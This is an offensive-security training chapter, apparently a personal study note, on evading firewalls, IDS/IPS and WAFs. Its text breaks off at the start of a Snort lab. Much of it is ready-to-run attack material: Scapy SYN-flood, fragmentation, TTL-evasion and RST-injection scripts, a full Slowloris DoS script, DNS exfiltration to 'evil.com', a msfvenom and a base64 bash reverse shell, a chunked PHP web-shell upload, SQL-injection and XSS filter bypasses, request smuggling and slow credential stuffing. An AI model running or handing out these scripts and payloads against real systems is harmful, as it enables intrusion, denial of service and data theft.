# Firewall & IDS Evasion: Ghost in the Machine

---
title: "Firewall & IDS Evasion"
parent: "[[02_Networking]]"
tags:
  - network
  - firewall
  - ids
  - ips
  - evasion
  - nmap
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Security controls (Firewalls, IDS, IPS) are rules engines. Like any code, they have blind spots, logic errors, and resource limits. Evasion is not "magic"; it is about presenting traffic that looks benign to the machine but malicious to the application, or simply exhausting the machine's ability to inspect. This chapter covers fragmentation, decoys, timing attacks, and side-channel techniques.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [The Defense Architecture](#2-the-defense-architecture)
3. [Firewall Types & Bypass Techniques](#3-firewall-types--bypass-techniques)
4. [IDS/IPS Architecture](#4-idsips-architecture)
5. [Fragmentation Attacks](#5-fragmentation-attacks)
6. [Decoys & Noise](#6-decoys--noise)
7. [Protocol Manipulation](#7-protocol-manipulation)
8. [Timing & Volume Evasion](#8-timing--volume-evasion)
9. [Encoding & Obfuscation](#9-encoding--obfuscation)
10. [Application Layer Evasion](#10-application-layer-evasion)
11. [WAF Bypass Techniques](#11-waf-bypass-techniques)
12. [Evading Signature-Based Detection](#12-evading-signature-based-detection)
13. [Anomaly Detection Bypass](#13-anomaly-detection-bypass)
14. [Advanced Evasion Techniques](#14-advanced-evasion-techniques)
15. [Practical Lab: Bypassing Snort](#15-practical-lab-bypassing-snort)
16. [Critical Analysis & Checkpoints](#16-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Bypass Filters**: Use IP Fragmentation to split malicious payloads across packets.
- **Confuse Analysis**: Use Decoy Scans (`-D`) to mask your true IP address.
- **Exploit Trust**: Use Source Port manipulation (`--source-port 53`) to traverse legacy ACLs.
- **Verify Evasion**: Use "Bad Checksum" scans to fingerprint Intrusion Detection Systems.
- **Understand Reassembly**: Explain how "Teardrop" attacks exploit OS reassembly differences.
- **Bypass WAFs**: Use encoding, parameter pollution, and HTTP verb tampering.
- **Evade Behavioral Analysis**: Understand anomaly detection and how to blend in.
- **Master Nmap Evasion**: Use all available Nmap evasion flags effectively.
- **Detect Security Devices**: Fingerprint firewalls, IDS/IPS, and load balancers.

---

## 2. The Defense Architecture

**BEGINNER EXPLANATION**: Think of network security as layers of security guards. The first guard (firewall) checks if you're allowed in the building. The second guard (IDS) watches what you're doing. The third guard (IPS) can physically stop you if you do something suspicious.

### 2.1 Firewall Types

**Packet Filter (Stateless)**:
```
Rule: ALLOW TCP port 80
Decision: Check each packet independently
Speed: Very fast
Weakness: Cannot track connection state
Example: iptables basic rules, ACLs
```

**Example Rule**:
```bash
# Allow HTTP
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Block from specific IP
iptables -A INPUT -s 203.0.113.50 -j DROP
```

**Stateful Inspection**:
```
Track Connection State:
- NEW: First packet of connection
- ESTABLISHED: Part of existing connection
- RELATED: Related to existing connection (FTP data channel)
- INVALID: Malformed or unexpected

Rule: ALLOW TCP port 80 state NEW, ESTABLISHED
Decision: Track SYN → SYN-ACK → ACK
Speed: Fast
Weakness: Can be resource exhausted
```

**Example Rule**:
```bash
# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow new HTTP connections
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
```

**Application Layer Gateway (Proxy/WAF)**:
```
Functionality:
- Full stream reassembly
- Protocol parsing
- Payload inspection
- Content filtering

Examples: Squid, ModSecurity, Cloudflare WAF
Speed: Slowest (deep inspection)
Strength: Can detect application-layer attacks
```

**Next-Generation Firewall (NGFW)**:
```
Features:
- Stateful inspection
- Deep packet inspection (DPI)
- Application awareness
- Intrusion prevention
- SSL/TLS inspection
- Identity-based rules

Examples: Palo Alto, Fortinet, Cisco Firepower
```

### 2.2 IDS vs IPS

**IDS (Intrusion Detection System)**:
```
┌──────────┐         ┌─────┐         ┌──────────┐
│ Attacker ├────────→│ IDS │────────→│  Target  │
└──────────┘         └──┬──┘         └──────────┘
                        │
                        ▼
                    [ALERT]
                  (Log only)
```

**Characteristics**:
- Passive monitoring (network tap)
- Cannot block traffic
- May send TCP RST to disrupt connection
- Alerts after the fact

**IPS (Intrusion Prevention System)**:
```
┌──────────┐         ┌─────┐         ┌──────────┐
│ Attacker ├────────→│ IPS ├────X────│  Target  │
└──────────┘         └──┬──┘         └──────────┘
                        │
                        ▼
                    [BLOCK]
                  (Drop packet)
```

**Characteristics**:
- Inline deployment
- Can drop/modify packets
- Must make real-time decisions
- Risk of false positives blocking legitimate traffic

### 2.3 Detection Methods

**Signature-Based (Pattern Matching)**:
```
Rule Example (Snort):
alert tcp any any -> any 80 (content:"|2F|etc|2F|passwd"; msg:"etc/passwd access")

Pros:
- Fast
- Low false positives
- Well understood

Cons:
- Only detects known attacks
- Evasion through polymorphism
- Requires constant updates
```

**Anomaly-Based (Behavioral)**:
```
Baseline: Average traffic 100 Mbps
Alert: Traffic > 500 Mbps (DDoS)

Baseline: User logs in from USA
Alert: Same user logs in from China 5 min later

Pros:
- Can detect zero-day attacks
- Adapts to environment

Cons:
- High false positive rate
- Requires training period
- Complex tuning
```

**Heuristic-Based**:
```
Rules based on behavior patterns:
- Shellcode execution patterns
- Buffer overflow indicators
- Suspicious API call sequences

Hybrid approach between signature and anomaly
```

---

## 3. Firewall Types & Bypass Techniques

### 3.1 ACL Bypass via Source Port

**Legacy Firewall Logic**:
```
Rule: ALLOW UDP src port 53 (DNS responses)
Intent: Allow DNS replies from external DNS servers

Attack:
nmap --source-port 53 -sU -p 1-1000 target
```

**How It Works**:
```
Normal DNS:
  Client:12345 → Server:53 (query)
  Server:53 → Client:12345 (response) ← ALLOWED by firewall

Attack:
  Attacker:53 → Target:1-1000 (scan)
  Firewall thinks: "Source port 53? Must be DNS response, ALLOW"
```

**Common Trusted Ports**:
```
53  - DNS
67/68 - DHCP
123 - NTP
20 - FTP Data
```

**Nmap Command**:
```bash
nmap --source-port 53 -p- target
nmap --source-port 67 -p 1-1000 target
```

### 3.2 Stateful Firewall Exhaustion

**SYN Flood**:
```python
#!/usr/bin/env python3
from scapy.all import *
import random

def syn_flood(target_ip, target_port):
    """
    Exhaust firewall state table
    """
    print(f"[*] SYN flooding {target_ip}:{target_port}")
    
    while True:
        # Random source IP and port
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        
        # Craft SYN packet
        pkt = IP(src=src_ip, dst=target_ip) / \
              TCP(sport=src_port, dport=target_port, flags='S')
        
        send(pkt, verbose=0)

# NEVER use without authorization
# syn_flood("192.168.1.100", 80)
```

**Result**: Firewall state table fills up, legitimate connections dropped.

### 3.3 Firewall Fingerprinting

**TTL Analysis**:
```bash
# Send packets with specific TTL
nmap --ttl 64 -p 80 target

# Different responses indicate firewall:
- TTL decreased but not to 0 = firewall in path
- ICMP Time Exceeded = router/firewall blocking
```

**Fragmentation Response**:
```bash
# Send fragmented packets
nmap -f target

# Firewall behaviors:
- Drops all fragments = strict firewall
- Allows first fragment = stateless firewall
- Reassembles correctly = stateful/NGFW
```

**Protocol-Specific Probes**:
```bash
# FIN scan
nmap -sF -p 80 target

# Expected (no firewall):
  Open port: No response
  Closed port: RST

# With firewall:
  All ports: No response or filtered response
```

---

## 4. IDS/IPS Architecture

### 4.1 Snort Architecture

```
┌─────────────────────────────────────────────┐
│         Packet Acquisition (pcap)           │
├─────────────────────────────────────────────┤
│              Packet Decoder                 │
│         (Ethernet, IP, TCP, etc.)           │
├─────────────────────────────────────────────┤
│             Preprocessors                   │
│  - Frag reassembly                          │
│  - Stream reassembly                        │
│  - HTTP normalize                           │
│  - RPC decode                               │
├─────────────────────────────────────────────┤
│          Detection Engine                   │
│      (Rule matching, Boyer-Moore)           │
├─────────────────────────────────────────────┤
│           Logging/Alerting                  │
│    (Syslog, Database, PCAP)                 │
└─────────────────────────────────────────────┘
```

### 4.2 Snort Rule Anatomy

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"Possible SQL Injection";
    flow:to_server,established;
    content:"UNION"; nocase;
    content:"SELECT"; nocase; distance:0;
    sid:1000001;
    rev:1;
)
```

**Components**:
- `alert` = Action (alert, log, pass, drop)
- `tcp` = Protocol
- `$EXTERNAL_NET any` = Source IP and port
- `$HOME_NET 80` = Destination IP and port
- `msg` = Alert message
- `flow` = Stream reassembly context
- `content` = Payload matching (case-insensitive)
- `distance` = Relative position from previous match
- `sid` = Signature ID
- `rev` = Revision number

### 4.3 Suricata Differences

**Advantages over Snort**:
- Multi-threading (better performance)
- GPU acceleration support
- Automatic protocol detection
- Lua scripting
- Better IPv6 support

**Rule Example**:
```
alert http any any -> any any (
    msg:"Possible Command Injection";
    http.uri; content:"|3B|"; # Semicolon
    pcre:"/;(cat|wget|curl|nc|bash)/i";
    sid:2000001;
)
```

### 4.4 Zeek (Bro) Event-Based Detection

**Different Approach**:
- Not signature-based
- Generates logs from traffic
- Scripts process events
- More flexible, higher learning curve

**Example Detection Script**:
```zeek
# Detect SSH brute force
event ssh_auth_failed(c: connection, user: string) {
    if (user in ssh_failed_attempts) {
        ssh_failed_attempts[user] += 1;
        if (ssh_failed_attempts[user] > 5) {
            print fmt("SSH brute force: %s from %s", user, c$id$orig_h);
        }
    } else {
        ssh_failed_attempts[user] = 1;
    }
}
```

---

## 5. Fragmentation Attacks

**BEGINNER EXPLANATION**: Imagine trying to sneak a weapon through airport security by sending it through piece by piece - the handle in one bag, the blade in another. Fragmentation works the same way with malicious payloads.

### 5.1 IP Fragmentation Basics

**Normal Fragmentation**:
```
Original Packet (2000 bytes)
MTU = 1500 bytes

Fragment 1: [IP Header | 1480 bytes data | More Fragments=1]
Fragment 2: [IP Header | 520 bytes data  | More Fragments=0]

Reassembly: Target OS combines using Fragment Offset field
```

**IP Header Fragment Fields**:
```
Identification: 0x1234 (same for all fragments)
Flags:
  - Bit 0: Reserved (always 0)
  - Bit 1: Don't Fragment (DF)
  - Bit 2: More Fragments (MF)
Fragment Offset: Position in original packet (units of 8 bytes)
```

### 5.2 Fragroute - Fragmentation Router

**Installation**:
```bash
apt-get install fragroute
```

**Configuration** (/etc/fragroute.conf):
```
# Fragment packets into 8-byte chunks
ip_frag 8

# Reorder fragments
ip_frag 16
order random

# Duplicate fragments
ip_frag 24
dup
```

**Usage**:
```bash
# Route traffic through fragroute
echo "ip_frag 8" | fragroute 192.168.1.100

# In another terminal
nmap 192.168.1.100
```

### 5.3 Nmap Fragmentation

**Basic Fragmentation**:
```bash
# Fragment into 8-byte chunks
nmap -f target

# Fragment into 16-byte chunks
nmap -ff target

# Custom MTU
nmap --mtu 24 target
# MTU must be multiple of 8
```

**Data Length**:
```bash
# Append random data to packets
nmap --data-length 50 target

# Useful to:
- Evade signature matching on packet size
- Make packets look like legitimate traffic
```

### 5.4 Overlapping Fragments Attack

**Concept**: Send fragments that overlap, with different data in the overlapping region.

**Example**:
```
Fragment 1: Offset 0,   Data: "GET /safe.html"
Fragment 2: Offset 10,  Data: "/etc/passwd"

IDS reassembly (First Fragment Preference):
  Result: "GET /safe.html"

Target OS reassembly (Last Fragment Preference):
  Result: "GET /etc/passwd"
```

**Tool - Fragrouter**:
```bash
# Install
apt-get install fragrouter

# Run with overlap mode
fragrouter -B1

# -B1 = First fragment preference (defeats some IDS)
```

### 5.5 Tiny Fragments

**Attack**: Make first fragment so small it doesn't include TCP header.

```
Fragment 1: [IP Header (20 bytes) | TCP Header first 8 bytes]
Fragment 2: [Remaining TCP header + data]

IDS: Cannot parse port numbers from Fragment 1
     Might skip inspection
Target: Reassembles and processes normally
```

**Example**:
```bash
nmap --mtu 8 -f target
```

### 5.6 Fragment Timeout Exploitation

**Concept**: Send fragments slowly to exceed IDS reassembly timeout.

```python
#!/usr/bin/env python3
from scapy.all import *
import time

def slow_fragment_attack(target_ip):
    """
    Send fragments with delays
    """
    payload = b"GET /etc/passwd HTTP/1.1\r\n\r\n"
    
    # Create fragments
    pkt = IP(dst=target_ip) / ICMP() / Raw(load=payload)
    frags = fragment(pkt, fragsize=8)
    
    for i, frag in enumerate(frags):
        print(f"[*] Sending fragment {i+1}/{len(frags)}")
        send(frag, verbose=0)
        time.sleep(30)  # Wait 30 seconds
        # IDS timeout = 60 seconds
        # Target OS timeout = 120 seconds
    
    print("[+] All fragments sent")

# slow_fragment_attack("192.168.1.100")
```

---

## 6. Decoys & Noise

**BEGINNER EXPLANATION**: Decoys are like throwing 10 rocks to create noise while you sneak in from a different direction. The security guard (IDS) can't investigate all 10 rocks at once.

### 6.1 Nmap Decoy Scan

**Random Decoys**:
```bash
# Generate 5 random decoy IPs
nmap -D RND:5 target

# Output in logs:
  Scan from: 203.0.113.50
  Scan from: 198.51.100.25
  Scan from: YOUR_REAL_IP
  Scan from: 192.0.2.100
  Scan from: 172.16.50.1
```

**Specific Decoys**:
```bash
# Specify decoy IPs
nmap -D 192.168.1.5,192.168.1.10,ME,192.168.1.15 target

# ME = your real IP
# Place it randomly in the list
```

**Strategic Decoy Selection**:
```bash
# Use IPs from same subnet (more believable)
nmap -D 192.168.1.100,192.168.1.101,ME,192.168.1.103 192.168.1.200

# Use legitimate infrastructure IPs
# (If you control 10.0.0.5, use it as decoy)
```

### 6.2 Idle Scan (Zombie Scan)

**BEGINNER EXPLANATION**: This is like having someone else knock on the door for you. You hide, and watch their reaction to figure out if the door is open or locked.

**Concept**:
```
Attacker → Zombie: "Hey, what's your IP ID?"
Zombie → Attacker: "My IP ID is 1000"

Attacker → Target (spoofed as Zombie): SYN
Target → Zombie: SYN-ACK (port open) or RST (port closed)
Zombie → Target: RST (confused, didn't send SYN)
  If port was open: Zombie's IP ID increments to 1001

Attacker → Zombie: "What's your IP ID now?"
Zombie → Attacker: "My IP ID is 1002" (incremented by 2)
  +1 from our probe
  +1 from response to target
  = Port was OPEN

Zombie → Attacker: "My IP ID is 1001" (incremented by 1)
  +1 from our probe only
  = Port was CLOSED
```

**Nmap Implementation**:
```bash
# Find idle zombie
nmap -O --script ipidseq target_subnet

# Look for "Incremental" IP ID sequence
# Good zombie: Low traffic, predictable IP ID

# Perform idle scan
nmap -Pn -sI zombie_ip:port target

# Example
nmap -Pn -sI 192.168.1.50:80 192.168.1.100
```

**Requirements for Good Zombie**:
- Incremental IP ID sequence
- Low network traffic (idle)
- Responds to probes
- Not behind NAT

### 6.3 Mass Confusion

**Spray and Pray**:
```bash
# Scan entire network slowly with decoys
for ip in $(seq 1 254); do
    nmap -D RND:10 -sS -p 22,80,443 192.168.1.$ip &
done

# Creates massive noise in logs
# Overwhelms analyst
```

**Distributed Scanning**:
```bash
# Use multiple source IPs (if you control multiple systems)
# System 1
nmap -sS -p 1-1000 target

# System 2
nmap -sS -p 1001-2000 target

# System 3
nmap -sS -p 2001-3000 target

# Logs show scans from 3 different IPs
```

---

## 7. Protocol Manipulation

### 7.1 TCP Flag Manipulation

**FIN Scan** (-sF):
```
Send: FIN packet (no SYN)
Open port: No response (RFC 793)
Closed port: RST

Evasion:
- Some firewalls only filter SYN packets
- Bypasses simple stateless filters
```

**Xmas Scan** (-sX):
```
Send: FIN, PSH, URG flags set (packet "lit up like a Christmas tree")
Open port: No response
Closed port: RST

Evasion:
- Unusual flag combination
- Some IDS ignore non-SYN packets
```

**NULL Scan** (-sN):
```
Send: No flags set
Open port: No response
Closed port: RST

Evasion:
- Extremely unusual
- May bypass flag-based filters
```

**Custom Flags**:
```bash
# Set specific TCP flags
nmap --scanflags URGACKPSH -p 80 target

# Scan with SYN and FIN (invalid combination)
nmap --scanflags SYNFIN -p 80 target

# Some firewalls drop invalid combinations
# Some pass them through
```

### 7.2 Protocol Tunneling

**HTTP over DNS**:
```python
#!/usr/bin/env python3
from scapy.all import *

def send_data_via_dns(data, dns_server):
    """
    Exfiltrate data using DNS queries
    """
    # Encode data in subdomain
    encoded = data.hex()
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    
    for chunk in chunks:
        query = f"{chunk}.exfil.evil.com"
        pkt = IP(dst=dns_server) / UDP(dport=53) / DNS(qd=DNSQR(qname=query))
        send(pkt, verbose=0)

# send_data_via_dns(b"secret data", "8.8.8.8")
```

**ICMP Tunneling**:
```bash
# Using ptunnel
# Server
ptunnel

# Client
ptunnel -p server_ip -lp 8000 -da target_ip -dp 80

# Access target via: localhost:8000
# Traffic tunneled through ICMP
```

### 7.3 TTL Manipulation

**TTL Evasion**:
```python
#!/usr/bin/env python3
from scapy.all import *

def ttl_evasion(target_ip, target_port):
    """
    Send packets with TTL calculated to expire at IDS
    """
    # Assume IDS is 3 hops away
    # Target is 5 hops away
    
    # Packet 1: Malicious payload, TTL=3 (expires at IDS)
    pkt1 = IP(dst=target_ip, ttl=3) / TCP(dport=target_port) / Raw(load=b"malicious")
    send(pkt1)
    
    # Packet 2: Benign payload, TTL=64 (reaches target)
    pkt2 = IP(dst=target_ip, ttl=64) / TCP(dport=target_port) / Raw(load=b"benign")
    send(pkt2)
    
    # IDS sees both (malicious first, then benign)
    # Target only sees benign (malicious expired before arrival)

# ttl_evasion("192.168.1.100", 80)
```

### 7.4 Bad Checksums

**Purpose**: Detect passive IDS vs inline IPS.

```bash
# Send packets with invalid checksums
nmap --badsum target

# Responses:
- No response: Normal (OS dropped bad checksum)
- Alert in IDS: IDS processed packet before validation
- Port appears open: Middlebox fixed checksum (IPS/Firewall)
```

**Custom Bad Checksum**:
```python
from scapy.all import *

# Create packet with bad checksum
pkt = IP(dst="192.168.1.100") / TCP(dport=80, flags="S")
pkt[IP].chksum = 0xFFFF  # Intentionally wrong
send(pkt)

# Valid OS: Drops silently
# Some IDS: Alerts anyway
```

---

## 8. Timing & Volume Evasion

**BEGINNER EXPLANATION**: If a security system is looking for "100 connections in 1 second," you can evade it by making only 1 connection per minute. Slow and steady avoids the radar.

### 8.1 Nmap Timing Templates

```
Template    Delay Between Packets    Use Case
-T0         5 minutes               Extreme stealth (impractical)
-T1         15 seconds              Evade IDS time-based detection
-T2         0.4 seconds             Polite scan
-T3         Default                 Normal scan
-T4         10 ms                   Aggressive
-T5         5 ms                    Insane (network flooding)
```

**Examples**:
```bash
# Paranoid scan (1 port every 5 minutes)
nmap -T0 -p 80,443 target
# Full port scan takes weeks

# Sneaky scan
nmap -T1 -p 1-1000 target

# Custom timing
nmap --scan-delay 10s target
nmap --max-rate 10 target  # Max 10 packets/second
```

### 8.2 Randomization

**Random Port Order**:
```bash
# Scan ports in random order
nmap -r target     # Sequential (default)
nmap target        # Random order

# Why:
  Sequential: 1, 2, 3, 4, 5... (obvious pattern)
  Random: 783, 12, 9045, 23... (harder to detect)
```

**Random Target Order**:
```bash
# Scan targets in random order
nmap --randomize-hosts 192.168.1.0/24

# Prevents "scanning sweep" pattern detection
```

### 8.3 Slow Application Layer Attacks

**Slowloris**:
```python
#!/usr/bin/env python3
import socket
import time
import random

def slowloris(target, port=80, sockets=200):
    """
    Slowloris DoS attack
    Opens many connections and sends headers slowly
    """
    socket_list = []
    
    # Create sockets
    for _ in range(sockets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            
            # Send partial HTTP request
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {target}\r\n".encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            
            socket_list.append(sock)
        except Exception as e:
            print(f"[!] Socket error: {e}")
    
    print(f"[*] Created {len(socket_list)} connections")
    
    # Keep connections alive by sending headers slowly
    while True:
        for sock in socket_list[:]:
            try:
                # Send another header to keep connection alive
                sock.send(f"X-{random.randint(1,10000)}: {random.randint(1,10000)}\r\n".encode())
            except:
                socket_list.remove(sock)
                # Create new socket to replace
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.connect((target, port))
                    new_sock.send(b"GET / HTTP/1.1\r\n")
                    socket_list.append(new_sock)
                except:
                    pass
        
        time.sleep(15)  # Every 15 seconds
        print(f"[*] Maintaining {len(socket_list)} connections")

# NEVER use without authorization
# slowloris("192.168.1.100")
```

**Characteristics**:
- Low bandwidth (KB/s)
- Long duration (hours/days)
- Evades "high bandwidth" alerts
- Exhausts server connection pool

---

## 9. Encoding & Obfuscation

**BEGINNER EXPLANATION**: Encoding is like writing in a different language or using synonyms. The meaning is the same, but it looks different to pattern-matching systems.

### 9.1 URL Encoding

**Standard Encoding**:
```
Original:  /etc/passwd
Encoded:   /%65%74%63/%70%61%73%73%77%64
Double:    /%2565%2574%2563/%2570%2561%2573%2573%2577%2564
```

**Bypass Example**:
```
Signature: "content:/etc/passwd"

Bypass:
  /%65tc/passwd
  /etc%2fpasswd
  /etc/./passwd
  /etc/../etc/passwd
```

### 9.2 Case Variation

**Mixed Case**:
```
Original: SELECT * FROM users
Bypass:   SeLeCt * FrOm users
Bypass:   select * from users (if signature is case-sensitive)
```

**HTTP Verb Tampering**:
```bash
# Normal
curl -X GET http://target/admin

# Bypass (if WAF only filters GET)
curl -X POST http://target/admin
curl -X HEAD http://target/admin
curl -X OPTIONS http://target/admin
```

### 9.3 Comment Injection (SQL)

**SQL Comment Obfuscation**:
```sql
Original: SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin

Bypass:
SELECT/*comment*/*/*comment*/FROM/*comment*/users/*comment*/WHERE/*comment*/id=1/*comment*/UNION/*comment*/SELECT/*comment*/password/*comment*/FROM/*comment*/admin

Inline comments:
SELECT/**/password/**/FROM/**/admin

MySQL-specific:
SELECT/*!password*/FROM/*!admin*/
```

### 9.4 Whitespace Manipulation

**Alternative Whitespace**:
```
Space:     %20
Tab:       %09
Newline:   %0A
Carriage:  %0D

SELECT%09*%0AFROM%0Dusers
```

### 9.5 Unicode Encoding

**Normalization Exploits**:
```
< = \u003C = \uFF1C (fullwidth)
> = \u003E = \uFF1E
/ = \u002F = \u2215 (division slash)

Script injection:
<script> = \uFF1Cscript\uFF1E

If WAF normalizes after filtering:
  Bypass successful
```

---

## 10. Application Layer Evasion

### 10.1 HTTP Parameter Pollution

**Concept**: Send duplicate parameters.

```http
GET /transfer?amount=1&amount=1000 HTTP/1.1
```

**Server Behaviors**:
| Platform | Result |
|----------|--------|
| PHP | Last value: 1000 |
| ASP.NET | Concatenate: "1,1000" |
| JSP | Array: [1, 1000] |

**Bypass**:
```
WAF checks first parameter: amount=1 (safe)
Application uses last parameter: amount=1000 (malicious)
```

### 10.2 HTTP Smuggling

**CL.TE (Content-Length vs Transfer-Encoding)**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

**Frontend (uses Content-Length)**:
- Forwards entire request (44 bytes)

**Backend (uses Transfer-Encoding)**:
- Processes `0\r\n\r\n` (end of chunks)
- Leaves `GET /admin...` in buffer for next request

### 10.3 HTTP/2 Exploits

**Header Injection**:
```
HTTP/2 allows headers with special characters
Some WAFs convert HTTP/2 → HTTP/1.1 incorrectly

Header name: "foo\r\nInjected: header"
After conversion: Two separate headers
```

---

## 11. WAF Bypass Techniques

**BEGINNER EXPLANATION**: A Web Application Firewall (WAF) is like a bouncer checking IDs. If you change your appearance just enough, the bouncer might not recognize you.

### 11.1 ModSecurity Bypass

**Common Signatures**:
```
Rule: Blocks "union select"
Bypass:
  uni/**/on select
  /*!50000union*/ select
  union distinctrow select
  union all select
```

**Blacklist Bypass**:
```
Blocked: <script>
Bypass:
  <ScRiPt>
  <script/x>
  <svg/onload=alert(1)>
  <img src=x onerror=alert(1)>
```

### 11.2 Cloudflare Bypass

**IP Whitelisting**:
```
Cloudflare checks X-Forwarded-For header
If value matches whitelist, bypass protection

Attack:
curl -H "X-Forwarded-For: 127.0.0.1" http://target/admin
curl -H "X-Forwarded-For: 8.8.8.8" http://target/admin
```

**Finding Real IP**:
```bash
# DNS history
dig @8.8.8.8 +short target.com
nslookup target.com

# Subdomain scanning
ffuf -u https://FUZZ.target.com -w subdomains.txt
# Subdomains may not be behind WAF

# Email headers
# Send email to target, inspect MX records

# SSL certificate SANs
openssl s_client -connect target.com:443 | openssl x509 -text
```

### 11.3 Request Method Tampering

**POST → GET Conversion**:
```bash
# Blocked POST
curl -X POST http://target/api -d "user=admin&pass=admin"

# Bypass with GET
curl "http://target/api?user=admin&pass=admin"
```

**Custom Verbs**:
```bash
curl -X TRACE http://target/
curl -X TRACK http://target/
curl -X DEBUG http://target/
```

### 11.4 Content-Type Manipulation

**JSON → XML**:
```bash
# Normal JSON (blocked)
curl -H "Content-Type: application/json" -d '{"user":"admin"}' http://target/api

# Try XML
curl -H "Content-Type: application/xml" -d '<user>admin</user>' http://target/api

# Try other types
Content-Type: multipart/form-data
Content-Type: text/plain
```

---

## 12. Evading Signature-Based Detection

### 12.1 Polymorphic Shellcode

**Concept**: Generate unique shellcode for each attack.

```python
# Metasploit payload encoding
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe

# -e: Encoder
# -i: Iterations (more iterations = more obfuscation)
```

**Manual NOP Sled Variation**:
```
Instead of: 0x90909090 (standard NOP)
Use random equivalent instructions:
  0x40 = INC EAX
  0x48 = DEC EAX
  0x91 = XCHG EAX, ECX
  0xD9D0 = FNOP
```

### 12.2 String Obfuscation

**Broken Strings**:
```python
# Original
os.system("cat /etc/passwd")

# Obfuscated
cmd = "cat"
cmd += " /etc/"
cmd += "passwd"
os.system(cmd)

# Or
cmd = "".join(["c", "a", "t", " ", "/", "e", "t", "c", "/", "p", "a", "s", "s", "w", "d"])
os.system(cmd)
```

**Base64 Encoding**:
```bash
# Original command
echo "bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" | base64

# Execute
bash -c "$(echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTAvNDQ0NCAwPiYx' | base64 -d)"
```

### 12.3 Protocol-Level Obfuscation

**HTTP Chunked Encoding**:
```http
POST /upload HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

5
<?php
7
 system
8
($_GET['
5
cmd']
3
);?
1
>
0

```

**Result**: Payload split across chunks, evades simple pattern matching.

---

## 13. Anomaly Detection Bypass

**BEGINNER EXPLANATION**: Anomaly detection looks for things that are "weird" or different from normal. To bypass it, you need to look normal.

### 13.1 Behavioral Mimicry

**User-Agent Rotation**:
```python
import random
import requests

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

headers = {"User-Agent": random.choice(user_agents)}
response = requests.get("http://target.com", headers=headers)
```

**Realistic Request Patterns**:
```python
# Bad (obvious automation)
for i in range(1000):
    requests.get(f"http://target.com/page{i}")
    
# Better (human-like)
import time
import random

for i in range(100):
    requests.get(f"http://target.com/page{i}")
    time.sleep(random.uniform(3, 15))  # Random delay 3-15 seconds
    
    # Occasionally request other resources
    if random.random() < 0.3:
        requests.get("http://target.com/css/style.css")
```

### 13.2 Traffic Blending

**Mix Attack with Legitimate Traffic**:
```
1. Browse normally (establish baseline)
2. Execute attack (small amount of malicious traffic)
3. Browse normally again
4. Repeat

Result: Attack traffic buried in legitimate traffic
```

### 13.3 Slow and Low Attacks

**Characteristics**:
- Low volume (under threshold)
- Long duration (weeks/months)
- Irregular timing (not mechanical)
- Mixed with benign activity

**Example - Credential Stuffing**:
```python
import time
import random

def slow_credential_stuffing(url, credentials):
    """
    Test credentials slowly to evade rate limiting
    """
    for username, password in credentials:
        # Random delay between attempts (1-30 minutes)
        delay = random.randint(60, 1800)
        print(f"[*] Waiting {delay} seconds...")
        time.sleep(delay)
        
        # Attempt login
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Welcome" in response.text:
            print(f"[+] Valid credentials: {username}:{password}")
            break
```

---

## 14. Advanced Evasion Techniques

### 14.1 Session Splicing

**Concept**: Split attack across multiple TCP sessions.

```
Session 1:
  Client → Server: "SELECT * FROM"
  [Close connection]

Session 2:
  Client → Server: "users WHERE id=1"
  [Close connection]

IDS: Sees two benign queries
Application: May cache and concatenate (context-dependent)
```

### 14.2 Firewall State Exhaustion

**TCP RST Injection**:
```python
from scapy.all import *

def rst_injection(victim_ip, attacker_ip, port):
    """
    Inject RST to close firewall state entry
    """
    # Guess sequence number range
    for seq in range(1000000, 1001000):
        pkt = IP(src=victim_ip, dst=attacker_ip) / \
              TCP(sport=port, dport=4444, flags='R', seq=seq)
        send(pkt, verbose=0)
    
    print("[*] RST injection complete")
    print("[*] Firewall may have dropped state entry")

# rst_injection("192.168.1.100", "192.168.1.50", 80)
```

### 14.3 DNS Tunneling Evasion

**Legitimate-Looking Queries**:
```
Bad (obvious):
AAAAABBBBCCCCDDDD.evil.com

Better:
cdn-images-2.eu-west-1.aws-cloud-services.evil.com
```

**Frequency Variation**:
```python
# Random delays between DNS queries
for data in chunks:
    query = f"{data}.evil.com"
    os.system(f"dig {query}")
    time.sleep(random.randint(30, 300))  # 30 seconds to 5 minutes
```

### 14.4 Certificate Pinning Bypass (Mobile)

**Frida Script**:
```javascript
Java.perform(function() {
    // Bypass SSL pinning in Android
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log('[+] SSL pinning bypassed');
        return untrustedChain;
    };
});
```

---

## 15. Practical Lab: Bypassing Snort

### Lab 1: Basic Signature Evasion

**Objective**: Evade Snort rule detecting `/etc/passwd`.

**Snort Rule**:
```
